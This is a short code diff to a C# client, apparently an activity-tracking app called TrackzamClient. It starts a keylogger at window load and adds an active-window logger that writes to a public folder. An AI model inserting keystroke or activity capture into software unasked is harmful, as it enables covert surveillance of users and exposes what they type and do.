@@ -30,11 +30,13 @@ namespace TrackzamClient
             k = new Keylogger();
             k.setPath(@"C:\\Test");
             k.Start();
+            ActiveWindowLogger.StartLogging("C:\\Users\\Public\\ActiveWindowLogs");
         }
 
         void MainWindow_Closing(object sender, EventArgs args)
         {
             k.Stop();
+            ActiveWindowLogger.StopLogging();
         }
 
         private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
